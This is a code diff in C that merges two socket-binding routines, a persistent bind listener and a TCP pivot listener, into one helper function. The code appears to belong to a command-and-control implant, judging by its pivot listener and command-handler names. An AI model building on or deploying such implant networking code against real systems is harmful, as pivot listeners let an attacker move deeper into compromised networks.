@@ -702,7 +702,8 @@ BOOL is_bound(unsigned short port) {
 }
 
 /* bind a socket */
-void command_socket_bind(char * buffer, int length, DWORD bindto) {
+/* bind 监听器公共体：bindto=0 绑 INADDR_ANY；check_bound 复用既有端口。 */
+static void bind_lsock(char * buffer, int length, DWORD bindto, int ltype, BOOL check_bound) {
 	datap            parser;
 	SOCKET MySock = INVALID_SOCKET;
 	unsigned short   port = 0;
@@ -714,43 +715,28 @@ void command_socket_bind(char * buffer, int length, DWORD bindto) {
 	port = data_short(&parser);
 
 	/* if we're already bound and managed here... do nothing */
-	if (is_bound(port))
+	if (check_bound && is_bound(port))
 		return;
 
 	/* setup our listening socket */
-	MySock = generic_listen(bindto, port, 10);
+	MySock = generic_listen(bindto ? bindto : INADDR_ANY, port, 10);
 
 	/* process the socket when it's up */
 	if (MySock != INVALID_SOCKET) {
-		_add_socket(MySock, nextId(), 0, LISTEN_PERSISTENT, port, STATE_CONNECT, 0);
+		_add_socket(MySock, nextId(), 0, ltype, port, STATE_CONNECT, 0);
 	}
 	else {
 		post_error_d(0x15, port);
 	}
 }
 
+void command_socket_bind(char * buffer, int length, DWORD bindto) {
+	bind_lsock(buffer, length, bindto, LISTEN_PERSISTENT, TRUE);
+}
+
 /* bind a socket */
 void command_socket_tcppivot(char * buffer, int length) {
-	datap            parser;
-	SOCKET MySock = INVALID_SOCKET;
-	unsigned short   port = 0;
-
-	/* init our data parser */
-	data_init(&parser, buffer, length);
-
-	/* parse our port value */
-	port = data_short(&parser);
-
-	/* setup our listening socket */
-	MySock = generic_listen(INADDR_ANY, port, 10);
-
-	/* process the socket when it's up */
-	if (MySock != INVALID_SOCKET) {
-		_add_socket(MySock, nextId(), 0, LISTEN_TCPPIVOT, port, STATE_CONNECT, 0);
-	}
-	else {
-		post_error_d(0x15, port);
-	}
+	bind_lsock(buffer, length, 0, LISTEN_TCPPIVOT, FALSE);
 }
 
 /* close a bound socket */
